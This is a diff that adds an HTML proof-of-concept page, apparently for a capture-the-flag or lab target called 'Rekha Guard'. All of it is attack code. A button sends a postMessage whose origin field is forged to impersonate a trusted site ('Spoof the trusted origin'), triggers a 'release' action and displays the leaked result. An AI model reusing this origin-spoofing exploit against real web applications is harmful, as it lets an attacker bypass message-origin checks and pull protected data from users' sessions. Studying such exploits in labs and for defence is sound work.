@@ -1,0 +1,40 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Rekha Guard Exploit</title>
+</head>
+<body>
+    <h1>Rekha Guard Boundary Exploit</h1>
+
+    <button id="attack">Release the Seal</button>
+
+    <pre id="output">Waiting...</pre>
+
+    <script>
+        document.getElementById("attack").onclick = function () {
+
+            window.addEventListener("message", function handler(event) {
+
+                if (
+                    event.data &&
+                    event.data.channel === "rekha-setu" &&
+                    event.data.kind === "release-result"
+                ) {
+                    document.getElementById("output").textContent =
+                        JSON.stringify(event.data.result, null, 2);
+
+                    window.removeEventListener("message", handler);
+                }
+            });
+
+            // Spoof the trusted origin
+            window.postMessage({
+                channel: "rekha-setu",
+                kind: "release",
+                origin: "https://panchavati.app"
+            }, "*");
+        };
+    </script>
+</body>
+</html>
